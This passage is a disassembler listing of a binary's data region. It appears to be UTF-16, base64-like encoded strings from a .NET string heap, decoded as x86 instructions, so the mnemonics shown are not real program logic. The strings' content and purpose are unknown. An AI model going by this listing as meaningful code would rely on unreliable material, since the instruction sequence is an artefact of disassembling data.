  40b181:	49                   	dec    %ecx
  40b182:	00 71 00             	add    %dh,0x0(%ecx)
  40b185:	4b                   	dec    %ebx
  40b186:	00 30                	add    %dh,(%eax)
  40b188:	00 30                	add    %dh,(%eax)
  40b18a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b18d:	53                   	push   %ebx
  40b18e:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  40b192:	00 68 00             	add    %ch,0x0(%eax)
  40b195:	4d                   	dec    %ebp
  40b196:	00 4e 00             	add    %cl,0x0(%esi)
  40b199:	35 00 53 00 4f       	xor    $0x4f005300,%eax
  40b19e:	00 65 00             	add    %ah,0x0(%ebp)
  40b1a1:	6c                   	insb   (%dx),%es:(%edi)
  40b1a2:	00 4a 00             	add    %cl,0x0(%edx)
  40b1a5:	63 00                	arpl   %eax,(%eax)
  40b1a7:	67 00 54 00          	add    %dl,0x0(%si)
  40b1ab:	63 00                	arpl   %eax,(%eax)
  40b1ad:	70 00                	jo     0x40b1af
  40b1af:	70 00                	jo     0x40b1b1
  40b1b1:	42                   	inc    %edx
  40b1b2:	00 69 00             	add    %ch,0x0(%ecx)
  40b1b5:	41                   	inc    %ecx
  40b1b6:	00 50 00             	add    %dl,0x0(%eax)
  40b1b9:	6b 00 69             	imul   $0x69,(%eax),%eax
  40b1bc:	00 6a 00             	add    %ch,0x0(%edx)
  40b1bf:	57                   	push   %edi
  40b1c0:	00 63 00             	add    %ah,0x0(%ebx)
  40b1c3:	2b 00                	sub    (%eax),%eax
  40b1c5:	36 00 64 00 68       	add    %ah,%ss:0x68(%eax,%eax,1)
  40b1ca:	00 66 00             	add    %ah,0x0(%esi)
  40b1cd:	34 00                	xor    $0x0,%al
  40b1cf:	45                   	inc    %ebp
  40b1d0:	00 5a 00             	add    %bl,0x0(%edx)
  40b1d3:	52                   	push   %edx
  40b1d4:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  40b1d8:	00 6e 00             	add    %ch,0x0(%esi)
  40b1db:	38 00                	cmp    %al,(%eax)
  40b1dd:	6c                   	insb   (%dx),%es:(%edi)
  40b1de:	00 4b 00             	add    %cl,0x0(%ebx)
  40b1e1:	54                   	push   %esp
  40b1e2:	00 31                	add    %dh,(%ecx)
  40b1e4:	00 49 00             	add    %cl,0x0(%ecx)
  40b1e7:	52                   	push   %edx
  40b1e8:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b1eb:	6d                   	insl   (%dx),%es:(%edi)
  40b1ec:	00 65 00             	add    %ah,0x0(%ebp)
  40b1ef:	43                   	inc    %ebx
  40b1f0:	00 73 00             	add    %dh,0x0(%ebx)
  40b1f3:	4d                   	dec    %ebp
  40b1f4:	00 37                	add    %dh,(%edi)
  40b1f6:	00 51 00             	add    %dl,0x0(%ecx)
  40b1f9:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  40b1fc:	00 6b 00             	add    %ch,0x0(%ebx)
  40b1ff:	77 00                	ja     0x40b201
  40b201:	49                   	dec    %ecx
  40b202:	00 50 00             	add    %dl,0x0(%eax)
  40b205:	48                   	dec    %eax
  40b206:	00 33                	add    %dh,(%ebx)
  40b208:	00 43 00             	add    %al,0x0(%ebx)
  40b20b:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40b20f:	4d                   	dec    %ebp
  40b210:	00 4b 00             	add    %cl,0x0(%ebx)
  40b213:	6d                   	insl   (%dx),%es:(%edi)
  40b214:	00 7a 00             	add    %bh,0x0(%edx)
  40b217:	41                   	inc    %ecx
  40b218:	00 59 00             	add    %bl,0x0(%ecx)
  40b21b:	4a                   	dec    %edx
  40b21c:	00 2b                	add    %ch,(%ebx)
  40b21e:	00 36                	add    %dh,(%esi)
  40b220:	00 68 00             	add    %ch,0x0(%eax)
  40b223:	59                   	pop    %ecx
  40b224:	00 46 00             	add    %al,0x0(%esi)
  40b227:	7a 00                	jp     0x40b229
  40b229:	59                   	pop    %ecx
  40b22a:	00 32                	add    %dh,(%edx)
  40b22c:	00 38                	add    %bh,(%eax)
  40b22e:	00 49 00             	add    %cl,0x0(%ecx)
  40b231:	7a 00                	jp     0x40b233
  40b233:	58                   	pop    %eax
  40b234:	00 7a 00             	add    %bh,0x0(%edx)
  40b237:	4d                   	dec    %ebp
  40b238:	00 56 00             	add    %dl,0x0(%esi)
  40b23b:	53                   	push   %ebx
  40b23c:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  40b240:	00 58 00             	add    %bl,0x0(%eax)
  40b243:	34 00                	xor    $0x0,%al
  40b245:	44                   	inc    %esp
  40b246:	00 51 00             	add    %dl,0x0(%ecx)
  40b249:	67 00 79 00          	add    %bh,0x0(%bx,%di)
  40b24d:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b251:	6e                   	outsb  %ds:(%esi),(%dx)
  40b252:	00 48 00             	add    %cl,0x0(%eax)
  40b255:	45                   	inc    %ebp
  40b256:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
  40b25a:	00 6d 00             	add    %ch,0x0(%ebp)
  40b25d:	44                   	inc    %esp
  40b25e:	00 61 00             	add    %ah,0x0(%ecx)
  40b261:	55                   	push   %ebp
  40b262:	00 32                	add    %dh,(%edx)
  40b264:	00 74 00 38          	add    %dh,0x38(%eax,%eax,1)
  40b268:	00 62 00             	add    %ah,0x0(%edx)
  40b26b:	5a                   	pop    %edx
  40b26c:	00 6b 00             	add    %ch,0x0(%ebx)
  40b26f:	4d                   	dec    %ebp
  40b270:	00 2b                	add    %ch,(%ebx)
  40b272:	00 32                	add    %dh,(%edx)
  40b274:	00 6d 00             	add    %ch,0x0(%ebp)
  40b277:	71 00                	jno    0x40b279
  40b279:	71 00                	jno    0x40b27b
  40b27b:	6d                   	insl   (%dx),%es:(%edi)
  40b27c:	00 33                	add    %dh,(%ebx)
  40b27e:	00 57 00             	add    %dl,0x0(%edi)
  40b281:	65 00 35 00 35 00 50 	add    %dh,%gs:0x50003500
  40b288:	00 57 00             	add    %dl,0x0(%edi)
  40b28b:	73 00                	jae    0x40b28d
  40b28d:	35 00 6e 00 71       	xor    $0x71006e00,%eax
  40b292:	00 48 00             	add    %cl,0x0(%eax)
  40b295:	39 00                	cmp    %eax,(%eax)
  40b297:	44                   	inc    %esp
  40b298:	00 35 00 4f 00 50    	add    %dh,0x50004f00
  40b29e:	00 2b                	add    %ch,(%ebx)
  40b2a0:	00 6a 00             	add    %ch,0x0(%edx)
  40b2a3:	2b 00                	sub    (%eax),%eax
  40b2a5:	72 00                	jb     0x40b2a7
  40b2a7:	30 00                	xor    %al,(%eax)
  40b2a9:	58                   	pop    %eax
  40b2aa:	00 66 00             	add    %ah,0x0(%esi)
  40b2ad:	2f                   	das
  40b2ae:	00 39                	add    %bh,(%ecx)
  40b2b0:	00 45 00             	add    %al,0x0(%ebp)
  40b2b3:	36 00 2f             	add    %ch,%ss:(%edi)
  40b2b6:	00 2b                	add    %ch,(%ebx)
  40b2b8:	00 37                	add    %dh,(%edi)
  40b2ba:	00 2f                	add    %ch,(%edi)
  40b2bc:	00 41 00             	add    %al,0x0(%ecx)
  40b2bf:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2c0:	00 32                	add    %dh,(%edx)
  40b2c2:	00 62 00             	add    %ah,0x0(%edx)
  40b2c5:	38 00                	cmp    %al,(%eax)
  40b2c7:	52                   	push   %edx
  40b2c8:	00 52 00             	add    %dl,0x0(%edx)
  40b2cb:	53                   	push   %ebx
  40b2cc:	00 50 00             	add    %dl,0x0(%eax)
  40b2cf:	58                   	pop    %eax
  40b2d0:	00 71 00             	add    %dh,0x0(%ecx)
  40b2d3:	51                   	push   %ecx
  40b2d4:	00 71 00             	add    %dh,0x0(%ecx)
  40b2d7:	52                   	push   %edx
  40b2d8:	00 39                	add    %bh,(%ecx)
  40b2da:	00 4f 00             	add    %cl,0x0(%edi)
  40b2dd:	70 00                	jo     0x40b2df
  40b2df:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40b2e3:	57                   	push   %edi
  40b2e4:	00 41 00             	add    %al,0x0(%ecx)
  40b2e7:	49                   	dec    %ecx
  40b2e8:	00 77 00             	add    %dh,0x0(%edi)
  40b2eb:	76 00                	jbe    0x40b2ed
  40b2ed:	45                   	inc    %ebp
  40b2ee:	00 7a 00             	add    %bh,0x0(%edx)
  40b2f1:	71 00                	jno    0x40b2f3
  40b2f3:	76 00                	jbe    0x40b2f5
  40b2f5:	72 00                	jb     0x40b2f7
  40b2f7:	62 00                	bound  %eax,(%eax)
  40b2f9:	59                   	pop    %ecx
  40b2fa:	00 46 00             	add    %al,0x0(%esi)
  40b2fd:	45                   	inc    %ebp
  40b2fe:	00 41 00             	add    %al,0x0(%ecx)
  40b301:	4e                   	dec    %esi
  40b302:	00 72 00             	add    %dh,0x0(%edx)
  40b305:	6f                   	outsl  %ds:(%esi),(%dx)
  40b306:	00 33                	add    %dh,(%ebx)
  40b308:	00 63 00             	add    %ah,0x0(%ebx)
  40b30b:	78 00                	js     0x40b30d
  40b30d:	49                   	dec    %ecx
  40b30e:	00 4f 00             	add    %cl,0x0(%edi)
  40b311:	56                   	push   %esi
  40b312:	00 4f 00             	add    %cl,0x0(%edi)
  40b315:	32 00                	xor    (%eax),%al
  40b317:	78 00                	js     0x40b319
  40b319:	2b 00                	sub    (%eax),%eax
  40b31b:	66 00 39             	data16 add %bh,(%ecx)
  40b31e:	00 4b 00             	add    %cl,0x0(%ebx)
  40b321:	49                   	dec    %ecx
  40b322:	00 74 00 76          	add    %dh,0x76(%eax,%eax,1)
  40b326:	00 49 00             	add    %cl,0x0(%ecx)
  40b329:	45                   	inc    %ebp
  40b32a:	00 77 00             	add    %dh,0x0(%edi)
  40b32d:	4a                   	dec    %edx
  40b32e:	00 77 00             	add    %dh,0x0(%edi)
  40b331:	52                   	push   %edx
  40b332:	00 53 00             	add    %dl,0x0(%ebx)
  40b335:	66 00 31             	data16 add %dh,(%ecx)
  40b338:	00 69 00             	add    %ch,0x0(%ecx)
  40b33b:	4f                   	dec    %edi
  40b33c:	00 72 00             	add    %dh,0x0(%edx)
  40b33f:	54                   	push   %esp
  40b340:	00 6f 00             	add    %ch,0x0(%edi)
  40b343:	75 00                	jne    0x40b345
  40b345:	31 00                	xor    %eax,(%eax)
  40b347:	4b                   	dec    %ebx
  40b348:	00 43 00             	add    %al,0x0(%ebx)
  40b34b:	58                   	pop    %eax
  40b34c:	00 62 00             	add    %ah,0x0(%edx)
  40b34f:	61                   	popa
  40b350:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b353:	66 00 41 00          	data16 add %al,0x0(%ecx)
  40b357:	4f                   	dec    %edi
  40b358:	00 76 00             	add    %dh,0x0(%esi)
  40b35b:	74 00                	je     0x40b35d
  40b35d:	55                   	push   %ebp
  40b35e:	00 57 00             	add    %dl,0x0(%edi)
  40b361:	6d                   	insl   (%dx),%es:(%edi)
  40b362:	00 6f 00             	add    %ch,0x0(%edi)
  40b365:	4d                   	dec    %ebp
  40b366:	00 51 00             	add    %dl,0x0(%ecx)
  40b369:	63 00                	arpl   %eax,(%eax)
  40b36b:	46                   	inc    %esi
  40b36c:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  40b370:	00 73 00             	add    %dh,0x0(%ebx)
  40b373:	59                   	pop    %ecx
  40b374:	00 33                	add    %dh,(%ebx)
  40b376:	00 56 00             	add    %dl,0x0(%esi)
  40b379:	63 00                	arpl   %eax,(%eax)
  40b37b:	4f                   	dec    %edi
  40b37c:	00 69 00             	add    %ch,0x0(%ecx)
  40b37f:	46                   	inc    %esi
  40b380:	00 7a 00             	add    %bh,0x0(%edx)
  40b383:	6a 00                	push   $0x0
  40b385:	57                   	push   %edi
  40b386:	00 30                	add    %dh,(%eax)
  40b388:	00 4a 00             	add    %cl,0x0(%edx)
  40b38b:	76 00                	jbe    0x40b38d
  40b38d:	69 00 62 00 77 00    	imul   $0x770062,(%eax),%eax
  40b393:	4a                   	dec    %edx
  40b394:	00 65 00             	add    %ah,0x0(%ebp)
  40b397:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  40b39b:	5a                   	pop    %edx
  40b39c:	00 66 00             	add    %ah,0x0(%esi)
  40b39f:	53                   	push   %ebx
  40b3a0:	00 76 00             	add    %dh,0x0(%esi)
  40b3a3:	42                   	inc    %edx
  40b3a4:	00 58 00             	add    %bl,0x0(%eax)
  40b3a7:	6b 00 78             	imul   $0x78,(%eax),%eax
  40b3aa:	00 55 00             	add    %dl,0x0(%ebp)
  40b3ad:	30 00                	xor    %al,(%eax)
  40b3af:	46                   	inc    %esi
  40b3b0:	00 39                	add    %bh,(%ecx)
  40b3b2:	00 42 00             	add    %al,0x0(%edx)
  40b3b5:	36 00 76 00          	add    %dh,%ss:0x0(%esi)
  40b3b9:	57                   	push   %edi
  40b3ba:	00 73 00             	add    %dh,0x0(%ebx)
  40b3bd:	7a 00                	jp     0x40b3bf
  40b3bf:	33 00                	xor    (%eax),%eax
  40b3c1:	43                   	inc    %ebx
  40b3c2:	00 43 00             	add    %al,0x0(%ebx)
  40b3c5:	68 00 39 00 45       	push   $0x45003900
  40b3ca:	00 62 00             	add    %ah,0x0(%edx)
  40b3cd:	41                   	inc    %ecx
  40b3ce:	00 4d 00             	add    %cl,0x0(%ebp)
  40b3d1:	79 00                	jns    0x40b3d3
  40b3d3:	4c                   	dec    %esp
  40b3d4:	00 62 00             	add    %ah,0x0(%edx)
  40b3d7:	76 00                	jbe    0x40b3d9
  40b3d9:	34 00                	xor    $0x0,%al
  40b3db:	77 00                	ja     0x40b3dd
  40b3dd:	55                   	push   %ebp
  40b3de:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
  40b3e2:	00 6a 00             	add    %ch,0x0(%edx)
  40b3e5:	30 00                	xor    %al,(%eax)
  40b3e7:	65 00 34 00          	add    %dh,%gs:(%eax,%eax,1)
  40b3eb:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40b3ef:	4a                   	dec    %edx
  40b3f0:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
  40b3f4:	00 74 00 51          	add    %dh,0x51(%eax,%eax,1)
  40b3f8:	00 46 00             	add    %al,0x0(%esi)
  40b3fb:	44                   	inc    %esp
  40b3fc:	00 54 00 4f          	add    %dl,0x4f(%eax,%eax,1)
  40b400:	00 66 00             	add    %ah,0x0(%esi)
  40b403:	44                   	inc    %esp
  40b404:	00 7a 00             	add    %bh,0x0(%edx)
  40b407:	38 00                	cmp    %al,(%eax)
  40b409:	42                   	inc    %edx
  40b40a:	00 45 00             	add    %al,0x0(%ebp)
  40b40d:	6a 00                	push   $0x0
  40b40f:	4d                   	dec    %ebp
  40b410:	00 78 00             	add    %bh,0x0(%eax)
  40b413:	78 00                	js     0x40b415
  40b415:	6f                   	outsl  %ds:(%esi),(%dx)
  40b416:	00 51 00             	add    %dl,0x0(%ecx)
  40b419:	46                   	inc    %esi
  40b41a:	00 6a 00             	add    %ch,0x0(%edx)
  40b41d:	74 00                	je     0x40b41f
  40b41f:	54                   	push   %esp
  40b420:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b423:	4d                   	dec    %ebp
  40b424:	00 46 00             	add    %al,0x0(%esi)
  40b427:	54                   	push   %esp
  40b428:	00 61 00             	add    %ah,0x0(%ecx)
  40b42b:	41                   	inc    %ecx
  40b42c:	00 48 00             	add    %cl,0x0(%eax)
  40b42f:	2b 00                	sub    (%eax),%eax
  40b431:	74 00                	je     0x40b433
  40b433:	34 00                	xor    $0x0,%al
  40b435:	4a                   	dec    %edx
  40b436:	00 6d 00             	add    %ch,0x0(%ebp)
  40b439:	6f                   	outsl  %ds:(%esi),(%dx)
  40b43a:	00 2f                	add    %ch,(%edi)
  40b43c:	00 78 00             	add    %bh,0x0(%eax)
  40b43f:	51                   	push   %ecx
  40b440:	00 70 00             	add    %dh,0x0(%eax)
  40b443:	33 00                	xor    (%eax),%eax
  40b445:	63 00                	arpl   %eax,(%eax)
  40b447:	78 00                	js     0x40b449
  40b449:	68 00 67 00 3d       	push   $0x3d006700
  40b44e:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40b454:	42                   	inc    %edx
  40b455:	00 39                	add    %bh,(%ecx)
  40b457:	00 45 00             	add    %al,0x0(%ebp)
  40b45a:	55                   	push   %ebp
  40b45b:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  40b45f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b462:	38 00                	cmp    %al,(%eax)
  40b464:	52                   	push   %edx
  40b465:	00 66 00             	add    %ah,0x0(%esi)
  40b468:	4b                   	dec    %ebx
  40b469:	00 7a 00             	add    %bh,0x0(%edx)
  40b46c:	76 00                	jbe    0x40b46e
  40b46e:	4c                   	dec    %esp
  40b46f:	00 71 00             	add    %dh,0x0(%ecx)
  40b472:	63 00                	arpl   %eax,(%eax)
  40b474:	6c                   	insb   (%dx),%es:(%edi)
  40b475:	00 49 00             	add    %cl,0x0(%ecx)
  40b478:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  40b47c:	2b 00                	sub    (%eax),%eax
  40b47e:	6a 00                	push   $0x0
  40b480:	37                   	aaa
  40b481:	00 30                	add    %dh,(%eax)
  40b483:	00 74 00 64          	add    %dh,0x64(%eax,%eax,1)
  40b487:	00 78 00             	add    %bh,0x0(%eax)
  40b48a:	2b 00                	sub    (%eax),%eax
  40b48c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b48d:	00 66 00             	add    %ah,0x0(%esi)
  40b490:	67 00 50 00          	add    %dl,0x0(%bx,%si)
  40b494:	79 00                	jns    0x40b496
  40b496:	48                   	dec    %eax
  40b497:	00 56 00             	add    %dl,0x0(%esi)
  40b49a:	51                   	push   %ecx
  40b49b:	00 77 00             	add    %dh,0x0(%edi)
  40b49e:	55                   	push   %ebp
  40b49f:	00 77 00             	add    %dh,0x0(%edi)
  40b4a2:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4a3:	00 58 00             	add    %bl,0x0(%eax)
  40b4a6:	41                   	inc    %ecx
  40b4a7:	00 38                	add    %bh,(%eax)
  40b4a9:	00 5a 00             	add    %bl,0x0(%edx)
  40b4ac:	57                   	push   %edi
  40b4ad:	00 72 00             	add    %dh,0x0(%edx)
  40b4b0:	45                   	inc    %ebp
  40b4b1:	00 6f 00             	add    %ch,0x0(%edi)
  40b4b4:	44                   	inc    %esp
  40b4b5:	00 35 00 64 00 57    	add    %dh,0x57006400
  40b4bb:	00 46 00             	add    %al,0x0(%esi)
  40b4be:	5a                   	pop    %edx
  40b4bf:	00 58 00             	add    %bl,0x0(%eax)
  40b4c2:	6a 00                	push   $0x0
  40b4c4:	59                   	pop    %ecx
  40b4c5:	00 65 00             	add    %ah,0x0(%ebp)
  40b4c8:	51                   	push   %ecx
  40b4c9:	00 4e 00             	add    %cl,0x0(%esi)
  40b4cc:	38 00                	cmp    %al,(%eax)
  40b4ce:	78 00                	js     0x40b4d0
  40b4d0:	56                   	push   %esi
  40b4d1:	00 6f 00             	add    %ch,0x0(%edi)
  40b4d4:	61                   	popa
  40b4d5:	00 39                	add    %bh,(%ecx)
  40b4d7:	00 68 00             	add    %ch,0x0(%eax)
  40b4da:	59                   	pop    %ecx
  40b4db:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40b4df:	00 71 00             	add    %dh,0x0(%ecx)
  40b4e2:	7a 00                	jp     0x40b4e4
  40b4e4:	4b                   	dec    %ebx
  40b4e5:	00 51 00             	add    %dl,0x0(%ecx)
  40b4e8:	31 00                	xor    %eax,(%eax)
  40b4ea:	70 00                	jo     0x40b4ec
  40b4ec:	49                   	dec    %ecx
  40b4ed:	00 4a 00             	add    %cl,0x0(%edx)
  40b4f0:	50                   	push   %eax
  40b4f1:	00 65 00             	add    %ah,0x0(%ebp)
  40b4f4:	30 00                	xor    %al,(%eax)
  40b4f6:	74 00                	je     0x40b4f8
  40b4f8:	44                   	inc    %esp
  40b4f9:	00 5a 00             	add    %bl,0x0(%edx)
  40b4fc:	79 00                	jns    0x40b4fe
  40b4fe:	67 00 3d             	add    %bh,(%di)
  40b501:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40b507:	39 00                	cmp    %eax,(%eax)
  40b509:	4f                   	dec    %edi
  40b50a:	00 69 00             	add    %ch,0x0(%ecx)
  40b50d:	48                   	dec    %eax
  40b50e:	00 59 00             	add    %bl,0x0(%ecx)
  40b511:	2b 00                	sub    (%eax),%eax
  40b513:	38 00                	cmp    %al,(%eax)
  40b515:	74 00                	je     0x40b517
  40b517:	39 00                	cmp    %eax,(%eax)
  40b519:	48                   	dec    %eax
  40b51a:	00 42 00             	add    %al,0x0(%edx)
  40b51d:	2f                   	das
  40b51e:	00 31                	add    %dh,(%ecx)
  40b520:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b523:	41                   	inc    %ecx
  40b524:	00 6f 00             	add    %ch,0x0(%edi)
  40b527:	47                   	inc    %edi
  40b528:	00 38                	add    %bh,(%eax)
  40b52a:	00 46 00             	add    %al,0x0(%esi)
  40b52d:	63 00                	arpl   %eax,(%eax)
  40b52f:	2f                   	das
  40b530:	00 65 00             	add    %ah,0x0(%ebp)
  40b533:	53                   	push   %ebx
  40b534:	00 30                	add    %dh,(%eax)
  40b536:	00 7a 00             	add    %bh,0x0(%edx)
  40b539:	65 00 6c 00 57       	add    %ch,%gs:0x57(%eax,%eax,1)
  40b53e:	00 62 00             	add    %ah,0x0(%edx)
  40b541:	39 00                	cmp    %eax,(%eax)
  40b543:	79 00                	jns    0x40b545
  40b545:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40b549:	74 00                	je     0x40b54b
  40b54b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b54c:	00 2f                	add    %ch,(%edi)
  40b54e:	00 49 00             	add    %cl,0x0(%ecx)
  40b551:	6d                   	insl   (%dx),%es:(%edi)
  40b552:	00 50 00             	add    %dl,0x0(%eax)
  40b555:	6b 00 43             	imul   $0x43,(%eax),%eax
  40b558:	00 79 00             	add    %bh,0x0(%ecx)
  40b55b:	41                   	inc    %ecx
  40b55c:	00 6b 00             	add    %ch,0x0(%ebx)
  40b55f:	72 00                	jb     0x40b561
  40b561:	48                   	dec    %eax
  40b562:	00 79 00             	add    %bh,0x0(%ecx)
  40b565:	33 00                	xor    (%eax),%eax
  40b567:	58                   	pop    %eax
  40b568:	00 5a 00             	add    %bl,0x0(%edx)
  40b56b:	48                   	dec    %eax
  40b56c:	00 7a 00             	add    %bh,0x0(%edx)
  40b56f:	61                   	popa
  40b570:	00 38                	add    %bh,(%eax)
  40b572:	00 38                	add    %bh,(%eax)
  40b574:	00 58 00             	add    %bl,0x0(%eax)
  40b577:	6c                   	insb   (%dx),%es:(%edi)
  40b578:	00 56 00             	add    %dl,0x0(%esi)
  40b57b:	36 00 73 00          	add    %dh,%ss:0x0(%ebx)
  40b57f:	37                   	aaa
  40b580:	00 31                	add    %dh,(%ecx)
  40b582:	00 77 00             	add    %dh,0x0(%edi)
  40b585:	42                   	inc    %edx
  40b586:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  40b58a:	00 48 00             	add    %cl,0x0(%eax)
  40b58d:	2f                   	das
  40b58e:	00 39                	add    %bh,(%ecx)
  40b590:	00 77 00             	add    %dh,0x0(%edi)
  40b593:	37                   	aaa
  40b594:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
  40b598:	00 76 00             	add    %dh,0x0(%esi)
  40b59b:	45                   	inc    %ebp
  40b59c:	00 4c 00 32          	add    %cl,0x32(%eax,%eax,1)
  40b5a0:	00 6f 00             	add    %ch,0x0(%edi)
  40b5a3:	69 00 4c 00 32 00    	imul   $0x32004c,(%eax),%eax
  40b5a9:	41                   	inc    %ecx
  40b5aa:	00 35 00 6f 00 55    	add    %dh,0x55006f00
  40b5b0:	00 51 00             	add    %dl,0x0(%ecx)
  40b5b3:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b5b8:	80 b1 55 00 5a 00 67 	xorb   $0x67,0x5a0055(%ecx)
  40b5bf:	00 59 00             	add    %bl,0x0(%ecx)
  40b5c2:	44                   	inc    %esp
  40b5c3:	00 5a 00             	add    %bl,0x0(%edx)
  40b5c6:	32 00                	xor    (%eax),%al
  40b5c8:	46                   	inc    %esi
  40b5c9:	00 4d 00             	add    %cl,0x0(%ebp)
  40b5cc:	34 00                	xor    $0x0,%al
  40b5ce:	74 00                	je     0x40b5d0
  40b5d0:	37                   	aaa
  40b5d1:	00 42 00             	add    %al,0x0(%edx)
  40b5d4:	58                   	pop    %eax
  40b5d5:	00 72 00             	add    %dh,0x0(%edx)
  40b5d8:	54                   	push   %esp
  40b5d9:	00 33                	add    %dh,(%ebx)
  40b5db:	00 4c 00 43          	add    %cl,0x43(%eax,%eax,1)
  40b5df:	00 66 00             	add    %ah,0x0(%esi)
  40b5e2:	78 00                	js     0x40b5e4
  40b5e4:	50                   	push   %eax
  40b5e5:	00 41 00             	add    %al,0x0(%ecx)
  40b5e8:	30 00                	xor    %al,(%eax)
  40b5ea:	43                   	inc    %ebx
  40b5eb:	00 38                	add    %bh,(%eax)
  40b5ed:	00 4e 00             	add    %cl,0x0(%esi)
  40b5f0:	41                   	inc    %ecx
  40b5f1:	00 53 00             	add    %dl,0x0(%ebx)
  40b5f4:	31 00                	xor    %eax,(%eax)
  40b5f6:	73 00                	jae    0x40b5f8
  40b5f8:	48                   	dec    %eax
  40b5f9:	00 48 00             	add    %cl,0x0(%eax)
  40b5fc:	6d                   	insl   (%dx),%es:(%edi)
  40b5fd:	00 39                	add    %bh,(%ecx)
  40b5ff:	00 41 00             	add    %al,0x0(%ecx)
  40b602:	6e                   	outsb  %ds:(%esi),(%dx)
  40b603:	00 64 00 78          	add    %ah,0x78(%eax,%eax,1)
  40b607:	00 73 00             	add    %dh,0x0(%ebx)
  40b60a:	50                   	push   %eax
  40b60b:	00 45 00             	add    %al,0x0(%ebp)
  40b60e:	75 00                	jne    0x40b610
  40b610:	56                   	push   %esi
  40b611:	00 71 00             	add    %dh,0x0(%ecx)
  40b614:	43                   	inc    %ebx
  40b615:	00 78 00             	add    %bh,0x0(%eax)
  40b618:	43                   	inc    %ebx
  40b619:	00 71 00             	add    %dh,0x0(%ecx)
  40b61c:	32 00                	xor    (%eax),%al
  40b61e:	2b 00                	sub    (%eax),%eax
  40b620:	42                   	inc    %edx
  40b621:	00 43 00             	add    %al,0x0(%ebx)
  40b624:	4b                   	dec    %ebx
  40b625:	00 30                	add    %dh,(%eax)
  40b627:	00 5a 00             	add    %bl,0x0(%edx)
  40b62a:	76 00                	jbe    0x40b62c
  40b62c:	77 00                	ja     0x40b62e
  40b62e:	46                   	inc    %esi
  40b62f:	00 62 00             	add    %ah,0x0(%edx)
  40b632:	4f                   	dec    %edi
  40b633:	00 61 00             	add    %ah,0x0(%ecx)
  40b636:	48                   	dec    %eax
  40b637:	00 6b 00             	add    %ch,0x0(%ebx)
  40b63a:	47                   	inc    %edi
  40b63b:	00 35 00 74 00 63    	add    %dh,0x63007400
  40b641:	00 49 00             	add    %cl,0x0(%ecx)
  40b644:	4c                   	dec    %esp
  40b645:	00 31                	add    %dh,(%ecx)
  40b647:	00 38                	add    %bh,(%eax)
  40b649:	00 6e 00             	add    %ch,0x0(%esi)
  40b64c:	33 00                	xor    (%eax),%eax
  40b64e:	2b 00                	sub    (%eax),%eax
  40b650:	59                   	pop    %ecx
  40b651:	00 37                	add    %dh,(%edi)
  40b653:	00 48 00             	add    %cl,0x0(%eax)
  40b656:	69 00 6d 00 68 00    	imul   $0x68006d,(%eax),%eax
  40b65c:	5a                   	pop    %edx
  40b65d:	00 55 00             	add    %dl,0x0(%ebp)
  40b660:	73 00                	jae    0x40b662
  40b662:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  40b666:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b66b:	03 33                	add    (%ebx),%esi
  40b66d:	00 00                	add    %al,(%eax)
  40b66f:	80 b1 58 00 7a 00 4a 	xorb   $0x4a,0x7a0058(%ecx)
  40b676:	00 4c 00 66          	add    %cl,0x66(%eax,%eax,1)
  40b67a:	00 36                	add    %dh,(%esi)
  40b67c:	00 7a 00             	add    %bh,0x0(%edx)
  40b67f:	75 00                	jne    0x40b681
  40b681:	71 00                	jno    0x40b683
  40b683:	30 00                	xor    %al,(%eax)
  40b685:	55                   	push   %ebp
  40b686:	00 65 00             	add    %ah,0x0(%ebp)
  40b689:	31 00                	xor    %eax,(%eax)
  40b68b:	69 00 54 00 36 00    	imul   $0x360054,(%eax),%eax
  40b691:	67 00 6e 00          	add    %ch,0x0(%bp)
  40b695:	69 00 4d 00 30 00    	imul   $0x30004d,(%eax),%eax
  40b69b:	6a 00                	push   $0x0
  40b69d:	77 00                	ja     0x40b69f
  40b69f:	7a 00                	jp     0x40b6a1
  40b6a1:	7a 00                	jp     0x40b6a3
  40b6a3:	62 00                	bound  %eax,(%eax)
  40b6a5:	37                   	aaa
  40b6a6:	00 31                	add    %dh,(%ecx)
  40b6a8:	00 6e 00             	add    %ch,0x0(%esi)
  40b6ab:	42                   	inc    %edx
  40b6ac:	00 59 00             	add    %bl,0x0(%ecx)
  40b6af:	2f                   	das
  40b6b0:	00 6f 00             	add    %ch,0x0(%edi)
  40b6b3:	65 00 74 00 65       	add    %dh,%gs:0x65(%eax,%eax,1)
  40b6b8:	00 4d 00             	add    %cl,0x0(%ebp)
  40b6bb:	65 00 46 00          	add    %al,%gs:0x0(%esi)
  40b6bf:	54                   	push   %esp
  40b6c0:	00 32                	add    %dh,(%edx)
  40b6c2:	00 70 00             	add    %dh,0x0(%eax)
  40b6c5:	42                   	inc    %edx
